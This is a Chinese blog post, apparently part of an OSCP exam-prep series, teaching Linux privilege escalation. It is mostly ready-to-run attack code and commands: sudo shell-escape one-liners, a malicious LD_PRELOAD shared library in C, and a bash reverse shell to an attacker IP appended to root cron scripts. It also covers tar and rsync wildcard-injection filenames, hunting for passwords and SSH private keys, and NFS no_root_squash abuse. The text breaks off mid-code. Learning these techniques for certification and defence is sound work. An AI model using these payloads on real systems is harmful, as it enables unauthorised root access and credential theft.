---
title: OSCP百日备考17｜Linux权限提升（下）：sudo滥用、Cron劫持、通配符注入到root的终极手册
url: https://mp.weixin.qq.com/s/gLcYqGE1epvUy6anfzg-tg
source: Doonsec's feed
date: 2026-07-02
fetch_date: 2026-07-03T05:44:59.490154
---

# OSCP百日备考17｜Linux权限提升（下）：sudo滥用、Cron劫持、通配符注入到root的终极手册

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Nw0LxfseydVDM7EgicZPgciawZ8Z3rV3RqtEPNEiadlj26mRQTZMz34Qu38xRSiavtM90YNyAzBnasS7RJ2ibgHPZZItUnmCPPwSywo6Egoq2pjQ/0?wx_fmt=jpeg)

# OSCP百日备考17｜Linux权限提升（下）：sudo滥用、Cron劫持、通配符注入到root的终极手册

原创

醉墨离
醉墨离

泷羽Sec-陌离

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydVRTzDZT3lNDHsTdmxwkEZa72O07PiaicGvyGAWNv1fUKYpicuRsibzZXDBk7BQ6EaKf9JDvEy6MuByqnAADEu3QvTScgBf8jp3hSM/640?wx_fmt=jpeg&from=appmsg)

上期我们把Linux提权的地基打好了——信息收集方法论、五大内核漏洞、SUID/SGID利用、Linux Capabilities。很多同学后台说照着跑了一遍，第一次用GTFOBins拿到了root，那个激动我隔着屏幕都能感觉到。

但紧跟着就有新问题了："学长，sudo -l 输出了一堆东西，我只知道直接sudo su那种是送分题，遇到只能sudo某个特定命令的怎么办？""linPEAS提示了我有可写的cron脚本，但我不知道怎么劫持。""tar命令的通配符注入到底咋回事，看了几篇教程都没看懂。"

**如果说上篇讲的是提权的"直拳"（正面硬刚内核漏洞和SUID），那这篇讲的就是提权的"柔术"——利用管理员配置上的微小疏忽，用巧劲把权限一步步撬开。** 这些手法不需要exploit-db上的CVE编号，不需要编译exp，但恰恰因为隐蔽，经常被新手忽略。我在上百台靶机里验证过，下面每一个技术都是能直接落地的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Nw0LxfseydVSY2EENOewGwX6EdZia2hI1nMWIfRACbWCQ0X0lUAd9H5AMsPbib4GbNv3UYFHcFwWwGMPzsSJW6nSaYCItJDysE5KFwxuibZSto/640?wx_fmt=png&from=appmsg)

## 一、先划生死线，下期也一样重要

| 工具/方法 | 考试状态 | 说明 |
| --- | --- | --- |
| 手工/自写脚本 | ✅ 完全允许 | 本篇所有内容的基础 |
| GTFOBins查询 | ✅ 完全允许（网站查询） | sudo二进制的利用方法 |
| pspy64 | ✅ 完全允许 | Cron监控神器 |
| chisel / ligolo-ng | ✅ 完全允许 | 端口转发/内网隧道 |
| NFS客户端挂载 | ✅ 完全允许 | NFS no\_root\_squash利用 |
| **Metasploit** | ⚠️ 限一台靶机 | 注意配额 |
| **商业扫描器** | ❌ 明确禁止 | 绝对不能碰 |

## 二、Sudo配置滥用——OSCP考试里性价比最高的提权方式

如果说提权有一个"起手式"，那一定是 `sudo -l`。上期讲了这是第一优先级命令，这期我们把它拆透——**不只要知道能sudo什么，还要知道每一个能sudo的二进制背后藏着什么提权路径。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Nw0LxfseydXmNH7ibjWPsKTESLwicFGdMgzrMgPoiaPJqLhRDQicIZM4NFLH5ZQtKmXlg1vC9xFrwJXibAUMMLeRIWdibEEuicS38xibITaOOnRopaw/640?wx_fmt=png&from=appmsg)

### 2.1 看懂sudo -l的输出

```
sudo -l
```

三种典型输出，三种处理方式：

**场景一：送分题**

```
User www-data may run the following commands on this host:
    (ALL : ALL) ALL
    (root) NOPASSWD: ALL
```

→ 直接 `sudo su` 或者 `sudo -i`，一步root。这种没啥好说的。

**场景二：只能以root身份执行特定命令**

```
User www-data may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
```

→ **这是OSCP考试里最常见的sudo提权场景。** 任何能sudo的二进制，去GTFOBins查对应的`sudo`利用命令：

```
# vim 提权
sudo vim -c ':!/bin/sh'

# find 提权
sudo find . -exec /bin/sh \; -quit

# python 提权
sudo python -c 'import os; os.system("/bin/bash")'

# less/more 提权
sudo less /etc/passwd
# 进入less后输入：!/bin/bash

# awk 提权
sudo awk 'BEGIN {system("/bin/sh")}'

# nmap（需要旧版本有--interactive）
sudo nmap --interactive
# 进入交互模式后：!sh
```

**场景三：sudo -l 需要密码**→ 不是你忘了密码，是你还没拿到这个用户的密码。先去翻配置文件、bash\_history（下面第四节会详细讲），密码可能就藏在某个地方。

### 2.2 LD\_PRELOAD——Sudo配置的隐藏核弹

有时候 `sudo -l` 的输出最后有这样一行：

```
env_keep+=LD_PRELOAD
```

**这行字意味着一件事：你可以注入一个恶意共享库，让sudo在提权执行任何命令之前先加载你的代码。** 这是提权成功率几乎100%的手法。

```
# 第一步：创建一个恶意共享库
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 第二步：编译
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# 第三步：用sudo跑任意一个你被允许的命令，挂上恶意库
sudo LD_PRELOAD=/tmp/shell.so apache2
# 或者换成任何sudo -l里列出的命令
# 执行后直接拿到root shell
```

**原理：**`LD_PRELOAD`是Linux的动态链接器环境变量，指定了在程序启动前强制加载的共享库。`_init()`函数会在main函数之前执行，里面的`setuid(0)`把进程UID改成root，`system("/bin/bash")`启动root shell。**整个过程不需要漏洞，只是利用了管理员忘记屏蔽LD\_PRELOAD这个环境变量。**

> ❝
>
> 这条手法在考试和实战中都极其有效。实战中很多运维为了方便调试，会保留LD\_PRELOAD的传递权限——他们不知道这个环境变量的威力有多大。

## 三、Cron任务劫持——等一个定时执行的root命令

Cron是Linux的定时任务调度器。root用户的定时任务天然以root权限运行——如果这些任务执行的脚本/二进制出现权限问题，你就可以劫持它。

![](https://mmbiz.qpic.cn/mmbiz_png/Nw0LxfseydWiaGiao29gohlBPmMU7RgYIWDZwtE7poNm1CrEt5iaqTCtMQvlgQ21KiaUWibEwayUWPJQNMS3W1jg1aztfdEicKR28Wf46RygWdDzA/640?wx_fmt=png&from=appmsg)

### 3.1 传统方法：直接看crontab文件

```
cat /etc/crontab          # 系统级定时任务
ls -la /etc/cron*          # 所有cron相关目录
crontab -l                 # 当前用户的定时任务
ls -la /var/spool/cron/crontabs/  # 各用户的crontab文件
```

**检查每一个定时任务调用的脚本：**

```
# 假设你发现了一个root的cron任务：
# */5 * * * * root /opt/scripts/backup.sh

ls -la /opt/scripts/backup.sh
# 如果权限是 -rwxrwxrwx（所有人可写）→ 提权成功

# 修改脚本，加一行反弹shell
echo 'bash -i >& /dev/tcp/攻击机IP/4444 0>&1' >> /opt/scripts/backup.sh
# 等5分钟，cron执行，你收到root shell
```

### 3.2 进阶方法：pspy64监控看不到的cron任务

有些cron任务你可能没法通过文件系统直接看到（权限不够），但pspy64可以通过监控进程列表来"偷看"。上一篇讲了基本用法，这篇展开实战场景：

```
# 在靶机/tmp部署pspy64
./pspy64

# 输出里关注以下模式：
# CMD: UID=0    PID=18473   | /bin/sh /root/secret_script.sh
# → UID=0表示这是root在跑
# → 去检查/root/secret_script.sh是否存在且可被你的用户访问

# CMD: UID=0    PID=18474   | tar -czf /backup/daily.tar.gz /var/www/
# → 注意这里写的是 tar 而不是 /usr/bin/tar（相对路径）！
# → 这说明可以劫持PATH变量，让root执行你伪造的tar
```

### 3.3 通配符注入——tar/rsync用了`*`就等于给了你提权通道

这是Cron提权里最容易漏掉的手法。很多运维写的备份脚本长这样：

```
# root的cron任务脚本 backup.sh
#!/bin/bash
cd /var/www/uploads
tar -czf /backup/web_backup.tar.gz *
```

这行 `tar ... *` 看起来人畜无害，实际上 `*` 会被shell展开成当前目录下所有文件的文件名。如果目录里有一个文件叫 `--checkpoint=1`，tar会把它当作命令行参数而不是文件名来解析！

```
# 第一步：进入被压缩的目录
cd /var/www/uploads   # 确认你的用户可以在这个目录里创建文件

# 第二步：创建恶意脚本
echo 'bash -i >& /dev/tcp/攻击机IP/4444 0>&1' > /tmp/rootshell.sh
chmod +x /tmp/rootshell.sh

# 第三步：创建触发文件（两个特殊文件名）
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=sh\ /tmp/rootshell.sh

# 第四步：等cron任务执行
# 当tar处理到目录里的文件时：
# tar看到 --checkpoint=1（每处理一个文件就触发checkpoint）
# tar看到 --checkpoint-action=exec=sh /tmp/rootshell.sh（checkpoint时执行脚本）
# → /tmp/rootshell.sh以root身份运行 → 反弹root shell!
```

**rsync也有类似的通配符利用：**

```
# 如果cron里是 rsync -a *.txt user@backup:/backup/
# 创建文件 "-e sh /tmp/rootshell.sh" 可以注入rsync的-e参数
touch -- '-e sh /tmp/rootshell.sh'
```

> ❝
>
> ⚠️ 考试中注意：通配符注入的前提是这个目录你的用户能写——所以先确认 `find / -writable -type d 2>/dev/null` 的输出里包含该目录。

## 四、密码和凭证狩猎——管理员留下的隐藏宝藏

管理员也是人，人就会偷懒。密码被写在配置文件、历史命令、备份文件里的概率比你想象的高得多。

### 4.1 bash\_history——最大概率找到密码的地方

```
# 看自己的历史
cat ~/.bash_history

# 看所有用户的历史（如果权限允许）
cat /home/*/.bash_history
cat /root/.bash_history
```

**重点搜索模式：**

```
# 找密码明文
grep -i "password" ~/.bash_history
grep -i "passwd" ~/.bash_history
grep -i "mysql" ~/.bash_history | grep -i "p"

# 找SSH连接记录（可能含用户名和密钥路径）
grep -i "ssh" ~/.bash_history
```

用户经常在命令行里直接输密码——比如 `mysql -u root -pMyPassword123`。这条命令会被完整记录在bash\_history里，密码直接暴露。

### 4.2 配置文件——Web应用的数据库密码全在这里

```
# WordPress
cat /var/www/html/wp-config.php | grep DB_PASSWORD

# Joomla
cat /var/www/html/configuration.php | grep password

# Laravel
cat /var/www/html/.env | grep DB_PASSWORD

# 所有web目录下搜password关键词
grep -rn "password" /var/www/ 2>/dev/null
grep -rn "DB_PASS" /var/www/ 2>/dev/null
grep -rn "passwd" /etc/ 2>/dev/null
```

**拿到数据库密码之后干什么？** 试三件事：

1. `su root` 输入这个密码（管理员可能把root密码和数据库密码设成一样）
2. `su 其他用户名` 输入这个密码（密码复用是人的天性）
3. SSH登录试这个密码（可能管理员的SSH密码也是同一个）

### 4.3 SSH私钥——无密码登录的快车道

```
# 找所有私钥文件
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name id_ecdsa 2>/dev/null
find / -name id_ed25519 2>/dev/null

# 找authorized_keys（看哪些公钥被信任了）
find / -name authorized_keys 2>/dev/null

# 看私钥权限——如果644（所有人可读），你就能复制走
ls -la /home/*/.ssh/id_rsa
```

**利用方式：**

```
# 把私钥内容复制到攻击机的文件中
chmod 600 stolen_id_rsa
ssh -i stolen_id_rsa root@靶机IP
# 如果该私钥属于root且无密码保护——直接root登录
```

### 4.4 备份和历史文件

管理员做配置修改前经常备份，备份文件容易忘记删：

```
# 找备份文件
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*backup*" -type f 2>/dev/null

# 看日志文件有没有泄露凭证
find /var/log -type f -readable 2>/dev/null | xargs grep -l -i "password\|credential\|token\|secret"
```

## 五、NFS配置错误——企业内网里的提权暗门

NFS（Network File System）是Linux之间共享文件系统的协议。如果NFS服务器配置了`no_root_squash`，客户端机器上的root用户在挂载的共享目录里也保留root权限——这就是提权的入口。

### 5.1 发现NFS提权机会

```
# 在靶机上查NFS共享配置
cat /etc/exports

# 关键看这一行：
# /shared *(rw,no_root_squash)
# → /shared目录 NFS共享，允许任何IP挂载(rw)，且客户端root权限保留(no_root_squash)
```

```
# 在攻击机上查目标开放了哪些NFS共享
showmount -e 靶机IP
```

### 5.2 利用no\_root\_squash

```
# 第一步：在攻击机（root权限）上挂载共享
mkdir /tmp/nfs_mount
mount -t nfs 靶机IP:/shared /tmp/nfs_mount

# 第二步：创建一个SUID程序放在共享目录里
cat > /tmp/nfs_mount/rootshell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);...